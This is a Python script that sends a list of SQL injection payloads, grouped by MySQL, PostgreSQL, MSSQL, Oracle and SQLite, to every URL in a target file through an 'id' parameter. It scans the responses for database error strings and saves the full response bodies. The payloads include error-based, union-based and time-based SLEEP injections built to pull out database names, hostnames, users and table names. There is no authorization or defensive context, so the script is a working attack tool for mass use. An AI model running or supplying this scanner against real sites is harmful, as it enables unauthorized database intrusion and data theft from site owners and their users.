import requests
import os
from colorama import Fore, Style, init

init(autoreset=True)

with open("url.txt", "r") as f:
    urls = [line.strip() for line in f if line.strip()]

payloads = [
    # MySQL
    "' AND EXP(~(SELECT * FROM (SELECT 1) t)) -- ",
    "' AND 0xG1 -- ",
    "' AND (SELECT * FROM (SELECT 1,2) t) = 1 -- ",
    "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y) -- ",
    "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT @@hostname), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y) -- ",
    # PostgreSQL
    "' AND 'a' ~ 'b[' -- ",
    "' AND jsonb_path_query_first('{'a':1}', '$.a') -- ",
    "' AND WITH RECURSIVE t AS (SELECT 1 UNION ALL SELECT 1 FROM t) SELECT * FROM t -- ",
    "' AND 1=CAST((SELECT current_database()) AS INT) -- ",
    "' AND 1=CAST((SELECT inet_server_addr()) AS INT) -- ",
    # MSSQL
    "; DECLARE @xml XML; SET @xml = '<root><a></a><b></b></root>'; SELECT @xml.value('(/root/c)[1]', 'INT') -- ",
    "; SELECT CAST('text' AS INT) -- ",
    "; RAISERROR('Error generated', 16, 1) -- ",
    "; SELECT 1 WHERE 1=CAST(DB_NAME() AS INT) -- ",
    "; SELECT 1 WHERE 1=CAST(@@servername AS INT) -- ",
    # Oracle
    "' UNION SELECT UTL_INADDR.get_host_address('invalid_host') FROM dual -- ",
    "' UNION SELECT XMLType('<invalid><xml>') FROM dual -- ",
    "' UNION SELECT SYS.DBMS_ASSERT.noop('invalid_input') FROM dual -- ",
    "' UNION SELECT NULL FROM dual WHERE 1=CAST((SELECT ora_database_name FROM dual) AS INT) -- ",
    "' UNION SELECT NULL FROM dual WHERE 1=CAST((SELECT SYS_CONTEXT('USERENV', 'HOST') FROM dual) AS INT) -- ",
    # SQLite
    "' UNION SELECT SUBSTR('text', -1, 1) -- ",
    "' UNION SELECT POW('text', 2) -- ",
    "' UNION SELECT DATE('invalid_date') -- ",
    "' AND 1=CAST((SELECT name FROM sqlite_master WHERE type='table' LIMIT 1) AS INT) -- ",
    "' AND 1=CAST((SELECT file FROM pragma_database_list LIMIT 1) AS INT) -- ",
    # Advanced Union-Based Injections
    "' UNION SELECT 1, version(), database(), user() FROM dual WHERE 1=CAST((SELECT COUNT(*) FROM information_schema.tables) AS INT) -- ",
    "' UNION SELECT 1, 0x62656e6368, 0x70617373776f7264, user() -- ",
    "' UNION SELECT 1, database(), (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()), user() -- ",
    "' UNION SELECT 1, (SELECT column_name FROM db1.table1 LIMIT 1), (SELECT column_name FROM db2.table2 LIMIT 1), user() -- ",
    # Advanced Boolean-Based Injections
    "' AND IF((SELECT LENGTH(database()))>5, SLEEP(5), 0) -- ",
    "' AND IF((SELECT SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1), 1, 1))='a', SLEEP(5), 0) -- ",
    "' AND IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>5, (SELECT table_name FROM information_schema.tables), 1) -- ",
    "' AND IF((SELECT ASCII(SUBSTRING((SELECT database()),1,1))) & 1, SLEEP(5), 0) -- ",
    # Combined Techniques
    "' UNION SELECT IF((SELECT LENGTH(database()))>5, SLEEP(5), 0), 1, user(), 4 -- ",
    "' UNION SELECT 1, IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>5, (SELECT table_name FROM information_schema.tables LIMIT 1), 1), 3, 4 -- ",
]

errors = ["sql", "syntax", "warning", "fatal", "mysql", "odbc", "oracle", "postgresql", "mssql", "[SQLSTATE]"]

for url in urls:
    print(f"\n--- Testing URL: {url} ---")

    filename = url.replace("http://", "").replace("https://", "").replace("/", "_")
    filepath = os.path.join("results", f"{filename}_results.txt")

    with open(filepath, "w", encoding="utf-8") as f_out:
        f_out.write(f"Results for {url}\n\n")

        for payload in payloads:
            try:
                response = requests.get(url, params={"id": payload})
                body = response.text.lower()

                found_errors = [err for err in errors if err in body]

                log_entry = (
                    f"{Fore.YELLOW}Payload: {payload}{Style.RESET_ALL}\n"
                    f"{Fore.GREEN}Status: {response.status_code}, Length: {len(response.text)}{Style.RESET_ALL}\n"
                )
                if found_errors:
                    log_entry += f"{Fore.RED}⚠️ Possible SQL error detected: {', '.join(found_errors)}{Style.RESET_ALL}\n"

                print(log_entry)

                file_entry = (
                    f"Payload: {payload}\n"
                    f"Status: {response.status_code}, Length: {len(response.text)}\n"
                )
                if found_errors:
                    file_entry += f"⚠️ Possible SQL error detected: {', '.join(found_errors)}\n"

                f_out.write(file_entry + "\n")
                f_out.write(response.text + "\n\n")

            except requests.exceptions.RequestException as e:
                error_msg = f"Error fetching {url} with payload {payload}: {e}\n"
                print(f"{Fore.RED}{error_msg}{Style.RESET_ALL}")
                f_out.write(error_msg + "\n")

    print(f"Saved results to {filepath}")
